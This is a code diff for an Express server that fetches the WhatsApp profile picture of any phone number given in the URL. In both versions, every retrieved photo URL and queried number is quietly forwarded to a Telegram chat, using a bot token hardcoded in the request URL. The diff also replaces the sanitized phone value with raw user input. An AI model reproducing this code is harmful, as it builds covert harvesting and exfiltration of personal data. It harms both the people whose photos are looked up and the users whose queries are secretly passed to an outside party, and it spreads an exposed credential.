@@ -15,8 +15,9 @@ app.use(cors());
 app.use(compression());
 
 const isValidPhoneNumber = (phone) => {
+    let formattedPhone = phone.startsWith('+') ? phone : `+${phone}`;
     // Parse the phone number without specifying a country code
-    const phoneNumber = parsePhoneNumberFromString(phone);
+    const phoneNumber = parsePhoneNumberFromString(formattedPhone);
 
     // Return true if the number is valid
     return phoneNumber ? phoneNumber.isValid() : false;
@@ -66,7 +67,7 @@ app.get('/:number', async (req, res) => {
         return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
     }
 
-    const phoneNumber = `${sanitizedPhone}@s.whatsapp.net`;
+    const phoneNumber = `${phone}@s.whatsapp.net`;
 
     if (pendingRequests.has(phoneNumber)) {
         const profilePicUrl = await pendingRequests.get(phoneNumber);
@@ -88,7 +89,7 @@ app.get('/:number', async (req, res) => {
         if (profilePicUrl) {
             res.json({ profilePicUrl, status:{status:''} });
 
-            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phoneNumber)}`;
+            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phone)}`;
             try {
                 await fetch(telegramUrl);
             } catch (fetchError) {
